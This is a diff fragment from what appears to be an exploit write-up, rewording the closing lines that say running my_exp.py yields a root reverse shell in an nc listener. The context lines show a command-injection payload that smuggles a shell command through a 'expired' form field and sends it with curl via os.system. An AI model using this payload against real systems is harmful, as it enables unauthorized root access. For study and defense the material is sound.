@@ -34,9 +34,8 @@ payload = f'user=gotroot&pam=&expired=2|echo "";{command2}'
 os.system(f"curl -k {url} -d '{payload}' -H '{header}'")
 ```
 
-And that is how you got `root` in your `nc` listener.
 Then
 ```
 python3 my_exp.py
 ```
-And the nc listener will get you a root reverse-shell.
+And the `nc` listener will get you a `root reverse-shell`.
